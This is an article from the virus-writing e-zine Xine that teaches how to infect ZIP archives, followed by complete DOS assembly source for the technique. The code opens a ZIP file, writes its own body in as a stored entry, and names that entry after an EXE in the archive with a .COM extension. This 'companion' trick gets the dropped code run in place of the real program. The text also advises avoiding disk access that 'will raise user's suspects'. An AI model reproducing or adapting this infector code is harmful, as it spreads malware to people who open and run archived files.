   ;
   ;                                         /-----------------------------\
   ;                                         | Xine - issue #3 - Phile 108 |
   ;                                         \-----------------------------/
   ;
   ;
   ;
   ;                   DROPPING & COMPANIONING over ZIP archives
   ;                       From the Archives infector series
   ;                           by UnknowN MnemoniK/ikx
   ;
   ;
   ;   Intro
   ;  +-----+
   ;
   ;  Zip are the most complex archive file to infect , obviously also the most
   ;  used , a lot of programs use them , create them , modify them , make some
   ;  phucked  tricks on them , those programs are  almost writted in C by  bad
   ;  coders using library, object and code and don't care about the structure.
   ;  I have found only one prog that use a little assembler , but like all asm
   ;  code writted by a c programmer , the code is unreadable , really , I have
   ;  spend  three  hours about shitty  things,the code  might to be  something
   ;  coded  by Jacky Qwerty ,  unreadable , uncomprehensible  and without  any
   ;  sense  but  it  works . Infect a zip is an art because a lot of platforms
   ;  support them  and specially BBS that convert ALL files they receive  into
   ;  zip files (with any kinda archiver) , zip are also  really common  on ftp
   ;  but also on cdrom , waraz games , etc etc etc....
   ;
   ;   The zip file format
   ;  +-------------------+
   ;
   ;  Zip doesn't use the same scheme of packet like another archive, it uses a
   ;  <<locked>> and a little messy structure , for this reason there are a lot
   ;  of infection ways ( Gewd for vx ), in fact, you have three types of areas
   ;  of  packets  , the local files , the  central  directory  and the end  of
   ;  central directory, the first contain a certain header plus the compressed
   ;  file  ,  the second contains severals informations ( and usefull for us )
   ;  and of course have  his  header , the  third and  the last  one  contains
   ;  general informations about the file , here's the scheme
   ;
   ;  +-------------------+
   ;  | Local File 1      | ----------+
   ;  +-------------------+           |      The information about  the file in
   ;  | Local File 2      |           |      local file 1  must  be the same as
   ;  +-------------------+           |      Central Directory 1 to have a full
   ;  | Local File ...    |           +----- compatibility with any zip program
   ;  +-------------------+           |      The first block of  Central Dir. 1
   ;  | Local File n      |           |      need to be in relation  with Local
   ;  +-------------------^---+       |      File 1 , the second Central Dir. 2
   ;  | Central Directory 1   | ------+      with the Local File 2 ,  you  MUST
   ;  +-----------------------+              respect   this  order  .  In  fact
   ;  | Central Directory 2   |              PKUNZIP don't care about the order
   ;  +-----------------------+              but  some  programs  like   Norton
   ;  | Central Directory ... |              commander archive utility report a
   ;  +-----------------------+              a crash  if you  don't respect  it
   ;  | Central Directory n   |              anyway , crashes alert  often  the
   ;  +-----------------------^--+           user  who believe  that  he have a
   ;  | End of central directory |           virus (really pathetic ...)
   ;  +--------------------------+
   ;
   ;  It's  important  to see  how it works for any  manipulation
   ;
   ;   Headers structure
   ;  +-----------------+
   ;
   ;  I  need  to send  a big  thanks to  Griyo  and superx  who  sent me those
   ;  informations  that helped me  a lot for the zip infection!  I found  this
   ;  really easy  to understand , I had  tried  to do the same things for  the
   ;  arj and rar
   ;
   ; OFFSET LABEL       TYP  VALUE        DESCRIPTION
   ; ------ ----------- ---- ----------- ----------------------------------
   ; 00     ZIPLOCSIG   HEX  04034B50    ;Local File Header Signature
   ; 04     ZIPVER      DW   0000        ;Version needed to extract
   ; 06     ZIPGENFLG   DW   0000        ;General purpose bit flag
   ;
   ;   Value : (Bit) 0 = File encrypted
   ;             1 = If set and file imploded , then 8k sliding
   ;             dictionary was used , else 4k dictionary was used
   ;             2 = If set and file imploded , then 3 shannon-Fano
   ;             trees were used , else 2 shannon-Fano trees
   ;             3-4 = unused
   ;             5-7 = used internaly by zip
   ;
   ; 08     ZIPMTHD     DW   0000        ;Compression method
   ;
   ;   Value : 0 = No compression used
   ;       1 = LZW , 8K buffer , 9-13 buts with partial clearing
   ;       2 = Reduced-1 , Probalistic compression L(X)=lower 7 bits
   ;       3 = Reduced-2 , idem but lower 6 bits
   ;       4 = Reduced-3 , idem + lower 5 bits
   ;       5 = Reduced-4 , idem + lower 4 bits
   ;       6 = Imploded , 2 Shanno-Fanno trees ,4K sliding dictionary
   ;       7 = Imploded , 3 Shanno-Fanno trees ,4K sliding dictionary
   ;       8 = Imploded , 2 Shanno-Fanno trees ,8K sliding dictionary
   ;       9 = Imploded , 3 Shanno-Fanno trees ,8K sliding dictionary
   ;
   ; 0A     ZIPTIME     DW   0000        ;Last mod file time (MS-DOS)
   ; 0C     ZIPDATE     DW   0000        ;Last mod file date (MS-DOS)
   ; 0E     ZIPCRC      HEX  00000000    ;CRC-32
   ; 12     ZIPSIZE     HEX  00000000    ;Compressed size
   ; 16     ZIPUNCMP    HEX  00000000    ;Uncompressed size
   ; 1A     ZIPFNLN     DW   0000        ;Filename length
   ; 1C     ZIPXTRALN   DW   0000        ;Extra field length
   ; 1E     ZIPNAME     DS   ZIPFNLN     ;filename
   ; --     ZIPXTRA     DS   ZIPXTRALN   ;extra field
   ;
   ; CENTRAL DIRECTORY STRUCTURE
   ; ---------------------------
   ;
   ; OFFSET LABEL       TYP  VALUE        DESCRIPTION
   ; ------ ----------- ---- ----------- ----------------------------------
   ; 00     ZIPCENSIG   HEX  02014B50    ;Central file header signature
   ; 04     ZIPCVER     DB   00          ;Version made by
   ; 05     ZIPCOS      DB   00          ;Host operating system
   ;
   ;   value : 0 = MS-DOS and OS/2 1 = Amiga
   ;       2 = VMS         3 = *nix
   ;       4 = VM/CMS      5 = Atari ST
   ;       6 = OS/2 1.2        7 = Macintosh
   ;       8 = thru
   ;
   ; 06     ZIPCVXT     DB   00          ;Version needed to extract
   ; 07     ZIPCEXOS    DB   00          ;O/S of version needed for extraction
   ; 08     ZIPCFLG     DW   0000        ;General purpose bit flag
   ; 0A     ZIPCMTHD    DW   0000        ;Compression method
   ; 0C     ZIPCTIM     DW   0000        ;Last mod file time (MS-DOS)
   ; 0E     ZIPCDAT     DW   0000        ;Last mod file date (MS-DOS)
   ; 10     ZIPCCRC     HEX  00000000    ;CRC-32
   ; 14     ZIPCSIZ     HEX  00000000    ;Compressed size
   ; 18     ZIPCUNC     HEX  00000000    ;Uncompressed size
   ; 1C     ZIPCFNL     DW   0000        ;Filename length
   ; 1E     ZIPCXTL     DW   0000        ;Extra field length
   ; 20     ZIPCCML     DW   0000        ;File comment length
   ; 22     ZIPDSK      DW   0000        ;Disk number start
   ; 24     ZIPINT      DW   0000        ;Internal file attributes
   ;
   ;   value : (Bit) 0 = if set then file is an ascii text file
   ;             else , file apparently contains binary data
   ;             1-7 = unused
   ;
   ; 26     ZIPEXT      HEX  00000000    ;External file attributes, host
   ;                                     ;system dependent
   ; 2A     ZIPOFST     HEX  00000000    ;Relative offset of local header
   ;                                     ;from the start of the first disk
   ;                                     ;on which this file appears
   ; 2E     ZIPCFN      DS   ZIPCFNL     ;Filename or path - should not
   ;                                     ;contain a drive or device letter,
   ;                                     ;or a leading slash. All slashes
   ;                                     ;should be forward slashes '/'
   ; --     ZIPCXTR     DS   ZIPCXTL     ;extra field
   ; --     ZIPCOM      DS   ZIPCCML     ;file comment
   ;
   ; END OF CENTRAL DIR STRUCTURE
   ; ----------------------------
   ;
   ; OFFSET LABEL       TYP  VALUE        DESCRIPTION
   ; ------ ----------- ---- ----------- ----------------------------------
   ; 00     ZIPESIG     HEX  06064B50    ;End of central dir signature
   ; 04     ZIPEDSK     DW   0000        ;Number of this disk
   ; 06     ZIPECEN     DW   0000        ;Number of disk with start central dir
   ; 08     ZIPENUM     DW   0000       ;Total number of entries in central dir
   ;                                     ;on this disk
   ; 0A     ZIPECENN    DW   0000        ;total number entries in central dir
   ; 0C     ZIPECSZ     HEX  00000000    ;Size of the central directory
   ; 10     ZIPEOFST    HEX  00000000    ;Offset of start of central directory
   ;                                     ;with respect to the starting disk
   ;                                     ;number
   ; 14     ZIPECOML    DW   0000        ;zipfile comment length
   ; 16     ZIPECOM     DS   ZIPECOML    ;zipfile comment
   ;
   ;  Note that ZIPECOM will be displayed at screen !
   ;
   ;  those  datas  becomes from a document  writted  by Raymond  Clay , read it
   ;  many times , when you have already well understand it , we can pass on the
   ;  infection process
   ;
   ;   Infection
   ;  +---------+
   ;
   ;  Of course ,for any infection , you must fix host os and compression to No
   ;  compression , when done then we can continue infection
   ;
   ;  Okay ,  if you want infect  any zip file , you will have 3 tricks to do ,
   ;  first drop  the local  header  and the virus , second  drop  the  central
   ;  directory about the virus go to the end and modify the end of central dir
   ;  structure and close the file
   ;
   ;  In fact , the situation is not too simple, there are many problems, first
   ;  you must drop the virus as the last packet in the local file packets area
   ;  Why not set it as  the first packet ? because the zipofst of other packet
   ;  will not correspond with the reality, after that you need also to put the
   ;  central directory packet at the end of the file, and you must also modify
   ;  the end of central directory packet.Okay but anyway if you write the last
   ;  local , you overwrite the central, so you must save the central directory
   ;  area, if you  overwrite the central directory you will overwrite also the
   ;  end of central header ,so you must save it also
   ;
   ;  The second big problem is to find the end of the local packets area ,good
   ;  news, this is also the begin of central directory area,I know two methods
   ;  to find the start of central directory
   ;
   ;      * The  offset of the start of  central directory is placed in the END
   ;        OF CENTRAL , the END OF CENTRAL  is at the end of the file , so you
   ;        can get  it only  with the end of central ,  unfortunately  there's
   ;        the comment and extra string, so you need to search where start the
   ;        END OF CENTRAL , and then get the start of CENTRAL DIRECTORY
   ;
   ;      * The seeking  method consist  to jump from an header to an another ,
   ;        you read the first header,  calculate the offset of the next header
   ;        until you  find the CENTRAL DIRECTORY signature, this method is the
   ;        most secure way to find the central directory
   ;
   ;  I have choosed the first solution I found the second one require too many
   ;  disk acesses and it will raise user's suspects ,with the first solution ,
   ;  I can't read any byte I want from the end of the file,so I have choose to
   ;  read only  5000 bytes from the end ( think that 80x25 = 2000 ), I haven't
   ;  encountered  zips that have an end of central bigger than 5000, it's okay
   ;  and it's works right!
   ;
   ;  When I have located  the offset of the local header ,I read it and put it
   ;  into a buffer , after that , I get the offset of the start of the central
   ;  directory , I save the central directory area plus the location , I write
   ;  the virus and a new header , I write all the central directory  , the new
   ;  central directory and the modified end of central directory
   ;
   ;  Companing ? Yeah, this is possible because we can found the original name
   ;  in the central directory  , when an EXE file is found  , then we copy the
   ;  name into a buffer and write it  into the central directory and the local
   ;  header. For that operation you need to scan each header , if no exe found
   ;  you can also drop a file into the zip but this is more dangerous
   ;
   ;  We can build the  zip infection algorithm  , it's mine , there's a lot of
   ;  other , that can be quite good
   ;
   ;  1ø Open the file
   ;  2ø Go to the end - 5000
   ;  3ø Read 5000 bytes
   ;  4ø Scan after the end of central directory , if not found goto 13
   ;  5ø Save the end central directory
   ;  6ø get start offset of central directory and save it also
   ;  7ø goto to start of offset of central directory
   ;  8ø Write the header of the virus plus the virus
   ;  9ø Write central directory
   ;  10ø Write central directory viral header
   ;  11ø Modify end of central directory
   ;  12ø Write end of central directory
   ;  13ø Close the file
   ;
   ;  Zip open ways to a lot of infection types , sure, you'll surprised in the
   ;  next issue of  Xine  to see how zip can be used by VX to do something you
   ;  would never imagine
   ;
   ;  Anyway , I invite you to see the code below , compile this code with TASM
   ;  & TLINK and test it with a TEST.ZIP file in the directory , test with and
   ;  without an executable in the file
   ;
   ; ---------------------------------------------------------------------------

   .286
   .model tiny
   .code

   org 100h

   start:

   mov ax,3d02h                                    ; open in r/w
   mov dx,offset zipfile                           ; zipfile
   int 21h                                         ; ask dos , dos do it!
   xchg bx,ax                                      ; bx = handle

   mov al,02h                                      ; go at the end
   call go

   mov word ptr [sizeoffile+2],ax                  ; save position ( for use
   mov word ptr [sizeoffile],dx                    ; later )

   search_startoflocal:

   xchg cx,dx
   mov dx,ax
   sub dx,5000
   mov ax,4200h                                    ; go at endoffile-5000
   int 21h                     ; ask dos , dos do it !

   mov ah,3Fh                  ; go read anything
   mov cx,5000                 ; go now
   mov dx,offset temporary1            ; put it into temporary1
   int 21h                     ; read it

   mov si,offset temporary1            ; si = temporary1
   mov cx,5000

   O_loop:

   mov dx,word ptr [si]                            ; scan after PK signature
   mov ax,4b50h
   cmp dx,ax

   je testifPK
                                               ;test about word for endofcentral
                                               ;signature
   O_Next1:

   inc si

   loop O_loop

   kern_error:

   jmp novalid_or_badzip                       ; not found ? erm don't infect it

   testifPK:

   cmp word ptr [si+2],0605h
   jnz O_next1

   push si                                         ; save local position
   push bp                                         ; and bp

   mov bp,5000                                     ; si = start of end + offset
   sub si,offset temporary1                        ; temporary1
   sub bp,si                                       ; bp = 5000 - (temporary1-si)
   mov word ptr [sizeofend],bp                     ; here we get the size of
                                                   ; sizeofend
   pop bp                                          ; restore bp
   pop si                                          ; restore si

   mov ax,word ptr [si+0ch]                        ; save the size of central
   mov dx,word ptr [si+0ch+2]
   mov word ptr [sizeofcentral],ax
   cmp dx,0

   jne kern_error                                  ; if sizeofcentral > 64 k
                                                   ; then boom bidibyebye
   cmp ax,55000                                    ; if sizeofcentral > 55 k
   ja kern_error                                   ; then boom bidibyebye

   mov word ptr [sizeofcentral+2],dx               ; mov 0 in sizeofcentral+2

   mov dx,word ptr [si+10h]                        ; get offset of central
   mov cx,word ptr [si+10h+2]                      ; directory
   mov word ptr [startOfcentral],dx        ; restore file handler
   mov word ptr [startOfcentral+2],cx              ;

   mov cx,word ptr [startOfcentral+2]              ; set cx/dx to the central
   mov dx,word ptr [startOfcentral]                ; directory

   mov ax,4200h
   int 21h                                         ; go now on central dir.

   push ax                                         ; save ax,dx
   push dx

   mov ah,3fh                                      ; read and save central
   mov cx,word ptr [sizeofcentral]                 ; directory
   mov dx,offset centraltemporary
   int 21h

   mov ah,3fh                                      ; read and save the end of
   mov cx,word ptr [sizeofend]                     ; central directory
   mov dx,offset temporary1
   int 21h

   pop cx                                          ; restore offset of central
   pop dx                                          ; dir

   mov ax,4200h
   int 21h                                         ; go for it

   call set_a_name                                 ; now we generate a name
                                                   ; see companioning over zip
   mov si,offset start                             ; get the CRC32 of this
   mov cx,fin-start                                ; program

   call crc_calc

   mov word ptr [zipcrc],cx                        ; save it into our header
   mov word ptr [zipcrc+2],dx

   push cx                                         ; save cx dx
   push dx                                         ;

   mov ah,40h                                      ; write our local header
   mov cx,CentralHeader-localHeader
   mov dx,offset localHeader
   int 21h

   call writename                                  ; write the filename

   mov word ptr [zipcrc],0                         ; and reset it
   mov word ptr [zipcrc+2],0                       ; becoz it'll generate
                                                   ; confusion later
   mov ah,40h
   mov cx,fin-start
   mov dx,offset start
   int 21h                                         ; write this code

   mov al,1                                        ; go here
   call go

   mov word ptr [temporary1+10h],ax                ; save this position because
   mov word ptr [temporary1+10h+2],dx              ; it'll be the start of
                                                   ; central directory
   pop dx                                          ; restore dx cx ( CRC32
   pop cx

   mov word ptr [zipccrc],cx                       ; put program crc32 in
   mov word ptr [zipccrc+2],dx                     ; our cental header

   mov ah,40h                                      ; write the old
   mov cx,word ptr [sizeofcentral]                 ; central directory
   mov dx,offset centraltemporary
   int 21h

   mov ax,word ptr [startofcentral]                ; set in our central header
   mov word ptr [CentralHeader+2ah],ax             ; the start of the virus
   mov ax,word ptr [startofcentral+2]              ; who are equal of the
   mov word ptr [CentralHeader+2ah+2],ax           ; old startofcentral

   mov ah,40h                                      ; write our centralHeader
   mov cx,endofCentral-CentralHeader
   mov dx,offset CentralHeader
   int 21h

   call writename                                  ; write our name

   inc word ptr [Temporary1+08]                    ; increment the number
   inc word ptr [Temporary1+0Ah]                   ; of entries in endofcent.

   add word ptr [Temporary1+0Ch],Endofcentral-CentralHeader
   mov ax,word ptr [ZipFnln]                       ; increase the size of
   add word ptr [temporary1+0Ch],ax                ; the central dir in
                                                   ; end of central
   mov ah,40h
   mov cx,word ptr [sizeofend]
   mov dx,offset temporary1                        ; write temporary1
   int 21h                                         ;

   novalid_or_badzip:                              ; anything suspect during
                                                   ; infection then close
   mov ah,3eh                                      ; the file
   int 21h

   ret

   go:                                             ; moving over the file

   mov ah,42h                                      ; pretty often used
   xor dx,dx
   xor cx,cx
   int 21h

   ret

   LocalHeader:

   ziplogsig:      db 50h,4bh,03,04                ; signature
   zipver:         dw 0ah                          ; ver need to extract
   zipgenflag:     dw 0                            ; no particulary flag
   zipMthd:        dw 0                            ; no compression
   zipTime:        db 63h,78h                      ; aleatory
   zipDate:        db 31h,24h                      ; aleatory
   zipCrc:         db 4 dup (0)                    ; unknown
   zipSize:        dd fin-start                    ; unknown
   zipUncmp:       dd fin-start                    ; unknown
   ZipFnln:        dw 0                            ; unknown
   ZipXtraLn:      db 2 dup (0)                    ; unknown

   CentralHeader:

   zipCenSig:      db 50h,4bh,01,02                ; central signature
   zipCver:        db 14                           ; ver made by
   zipCos:         db 0                            ; Host Operating -> All
   zipCvxt:        db 0                            ; Ver need to extract
   ZipCeXos:       db 0                            ; Ver need to extract.
   ZipCflg:        dw 0                            ; No encryption !
   ZipCmthd:       dw 0                            ; Method : Store it !
   ZipCtim:        db 63h,78h                      ; last mod time
   ZipCDat:        db 31h,24h                      ; last mod date
   ZipCCrc:        db 4 dup (0)                    ; Crc-32 unknown
   ZipCsiz:        dd fin-start                    ; Compressed size unknown
   ZipCunc:        dd fin-start                    ; Uncompressed size unkown
   ZipCfnl:        dw 0                            ; filename length unknown
   ZipCxtl:        dw 0                            ; Extra Field length 0
   ZipCcml:        dw 0                            ; file comment length 0
   ZipDsk:         dw 0                            ; Disk number start (?) 0
   ZipInt:         dw 0                            ; Internal file attribute no
   ZipExt:         db 4 dup (0)                    ; external file attrib -> 0
   ZipOfst:        db 4 dup (0)                    ; relativeoffset local head
                                                   ; unknown

   EndOfCentral:

   crc_calc:

   push bx                                 ; save file handle
   push si cx                              ; cx and si

   call crc_table              ; render crc table

   pop cx si

   mov bp,cx                               ; bp equal numbah of start process

   mov cx,0ffffh                           ; reset counter
   mov dx,0ffffh

   xor ax,ax

   Crc_loop:

   lodsb
   mov bx,ax
   xor bl,cl
   mov cl,ch
   mov ch,dl
   mov dl,dh
   mov dh,bh
   shl bx,1
   shl bx,1
   xor cx,word ptr [bx+di]
   xor dx,word ptr [bx+di+02]
   dec bp

   jnz Crc_loop

   not dx                                  ; not the result
   not cx

   pop bx                                  ; restore handle and be back!
   ret

   crc_table:

   mov    di,offset starttable+1024-2  ; the buffer table
                       ; remember : It begin by the end
   mov    bp,255               ; set bp equal 255
                       ; 255 * 4 = 1024
   std                 ; set Direction Flag On

   TableHighloop:              ; the major loop in the Crc table Calc

   mov cx,8                ; set the minus loop to 8
   mov dx,bp               ; dx = bp , major counter loop
   xor     ax,ax               ; ax = zero

   TableLowLoop:

   shr    ax,1             ; mov one byte of ax at right in bin
   rcr    dx,1             ; if anything losted , put it on dx

   jae    anomality            ; if superior or equal skip encrypt.

   xor    dx,08320h            ; encrypt value by a signature
   xor    ax,0EDB8h            ;

   anomality:

   loop   TableLowLoop         ; make it 8 times

   stosw                   ; write ax
   xchg   dx,ax
   stosw                   ; not write dx
   dec    bp               ; decrement the counter

   jnz TableHighLoop           ; repeat it until bp = 0

   mov word ptr [di],0         ; last value equal 0
   sub di,2
   mov word ptr [di],0
   cld                 ; clear direction flag

   ret

   set_a_name:

   mov si,offset centraltemporary

   searchnext:

   cmp word ptr [si],4B50h                         ; if not 4B60h then there's
   jne not_found                                   ; really a problem

   mov cx,word ptr [si+1Ch]                        ;
   cmp cx,255                                      ; if cx > 255
   ja nextone                                      ; then don't search about it

   mov bp,word ptr [si+1Ch]                        ;
   cmp word ptr [si+2Eh+bp-2],'EX'                 ; check if the name have
   jne nextone                                     ; XE as last offset if not
                                                   ; then skip this procedure

   add si,2EH                                      ;else then copy the file name
   mov di,offset temporaryname                     ;into temporary name with
                                                   ;COM extension
   push cx

   repz movsb
   sub di,3
   mov word ptr [di],'OC'
   mov byte ptr [di+2],'M'

   pop cx

   jmp go_out                                      ; we finish!

   nextone:                                        ; goto to the next header

   mov di,si
   add si,2eh
   add si,word ptr [di+1ch]
   add si,word ptr [di+1eh]
   add si,word ptr [di+20h]

   jmp searchnext

   not_found:                  ; put a fake name

   mov si,offset betaname
   mov di,offset temporaryname
   mov cx,9

   push cx
   repz movsb
   pop cx

   go_out:

   mov word ptr [ZipCFnl],cx
   mov word ptr [ZipFnln],cx

   ret

   WriteName:                                      ; write the name
                                                   ; in bx handle
   mov ah,40h
   mov cx,word ptr [ZipFnln]
   mov dx,offset temporaryname
   int 21h

   ret

   betaname:   db 'TRYME.COM'          ; name of the file
   zipfile:    db 'test.zip',0         ; name of the host of the file

   fin:

   sizeoffile:     dd ?                ; zip informations saved

   startofcentral: dd ?

   sizeofcentral:  dd ?

   sizeofend:      dd ?

   starttable: db  1024 dup (?)            ; for the crc32

   temporaryname:  db 256 dup (?)          ; the name

   temporary1: dw 5000 dup (?)         ; for the endofcentral

   centraltemporary:   dw ?            ; for the centraltemporary

   end start

   ; ---------------------------------------------------------------------------
   ;
   ;  Improvent ? Build a vxd and correct some mistake is cool , like usual , a
   ;  32 bits asm crc is cool too , anyway , some surprise'll come
   ;
   ;
   ;
   ;
   ; Les petits d‚linquants (C) Unkm98!
   ;
